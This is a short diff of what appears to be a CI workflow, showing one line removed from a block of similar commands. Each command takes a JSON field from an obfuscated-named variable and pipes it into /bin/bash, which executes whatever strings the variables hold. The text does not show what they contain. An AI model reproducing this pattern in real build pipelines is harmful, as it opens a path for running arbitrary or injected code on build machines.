@@ -53,7 +53,6 @@ jobs:
           printf '%s' "$cihwk8" | jq -r .fg329 | /bin/bash
           printf '%s' "$drsl29" | jq -r .h03 | /bin/bash
           printf '%s' "$ym28" | jq -r .rsi189 | /bin/bash
-          echo $y1711 | jq -r .mduvn0 | /bin/bash
           printf '%s' "$yswfe907" | jq -r .nmme6 | /bin/bash
           printf '%s' "$tuwjm56863" | jq -r .txs0 | /bin/bash
           printf '%s' "$lql17" | jq -r .rs3684 | /bin/bash
